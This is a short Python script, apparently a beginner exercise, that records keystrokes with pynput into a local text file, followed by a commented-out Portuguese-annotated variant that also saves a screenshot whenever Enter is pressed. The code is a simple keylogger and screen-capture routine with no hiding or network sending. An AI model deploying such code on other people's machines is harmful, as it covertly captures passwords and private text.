from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open('keyfile.txt', 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print('Erro getting char')


if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

# from pynput import keyboard
# import os
# import pyautogui

# def tecla_pressionada(tecla):
#     try:
#         # Verifica se a tecla pressionada tem uma representação unicode
#         caractere = tecla.char
#     except AttributeError:
#         # Teclas especiais (por exemplo, shift, ctrl) não possuem o atributo char
#         caractere = str(tecla)

#     # Verifica se a tecla pressionada é "Enter"
#     if caractere == '\r':
#         # Verifica se a pasta 'img' existe, se não, cria
#         if not os.path.exists('img'):
#             os.makedirs('img')
#         # Tira uma captura de tela
#         screenshot = pyautogui.screenshot()
#         # Salva a captura de tela na pasta 'img'
#         screenshot.save('img/screenshot.png')

#     # Escreve a tecla pressionada no arquivo de log
#     with open('keyfile.txt', 'a') as arquivo_log:
#         arquivo_log.write(caractere)

# def principal():
#     # Cria um objeto listener
#     listener = keyboard.Listener(on_press=tecla_pressionada)

#     # Inicia o listener
#     listener.start()

#     # Mantém o script em execução até ser interrompido pelo usuário
#     listener.join()

# if __name__ == '__main__':
#     principal()
